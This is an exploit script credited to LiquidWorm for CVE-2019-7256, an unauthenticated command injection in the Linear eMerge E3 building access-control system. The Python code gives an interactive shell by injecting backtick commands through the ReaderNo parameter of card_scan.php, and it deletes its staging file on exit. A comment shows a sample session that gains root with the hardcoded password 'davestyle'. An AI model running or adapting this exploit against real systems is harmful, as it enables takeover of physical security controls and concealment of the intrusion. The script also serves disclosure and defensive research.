# Exploit Author: LiquidWorm
# Vendor Homepage: http://linear-solutions.com/nsc_family/e3-series/
# Software Link: http://linear-solutions.com/nsc_family/e3-series/
# Version: 1.00-06
# Tested on: NA
# CVE : CVE-2019-7256
# Advisory: https://applied-risk.com/resources/ar-2019-009
# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
# Advisory: https://applied-risk.com/resources/ar-2019-005

#!/usr/bin/env python
#
###################################################################
# lqwrm@metalgear:~/stuff$ python emergeroot1.py 192.168.1.2
#
# lighttpd@192.168.1.2:/spider/web/webroot$ id
# uid=1003(lighttpd) gid=0(root)
#
# lighttpd@192.168.1.2:/spider/web/webroot$ echo davestyle |su -c id
# Password: 
# uid=0(root) gid=0(root) groups=0(root)
#
# lighttpd@192.168.1.2:/spider/web/webroot$ exit
#
# [+] Erasing read stage file and exiting...
# [+] Done. Ba-bye!
#
###################################################################

import requests
import sys,os##

piton = os.path.basename(sys.argv[0])

if len(sys.argv) < 2:
	print &#039;\n\x20\x20[*] Usage: &#039;+piton+&#039; <ipaddress:port>\n&#039;
	sys.exit()

ipaddr = sys.argv[1]

print
while True:
	try:
		cmd = raw_input(&#039;lighttpd@&#039;+ipaddr+&#039;:/spider/web/webroot$ &#039;)
		execute = requests.get(&#039;http://&#039;+ipaddr+&#039;/card_scan.php?No=30&ReaderNo=%60&#039;+cmd+&#039; > test.txt%60&#039;)
		readreq = requests.get(&#039;http://&#039;+ipaddr+&#039;/test.txt&#039;)
		print readreq.text
		if cmd.strip() == &#039;exit&#039;:
			print "[+] Erasing read stage file and exiting..."
			requests.get(&#039;http://&#039;+ipaddr+&#039;/card_scan.php?No=30&ReaderNo=%60rm test.txt%60&#039;)
			print "[+] Done. Ba-bye!\n"
			break
		else: continue
	except Exception:
		break

sys.exit()

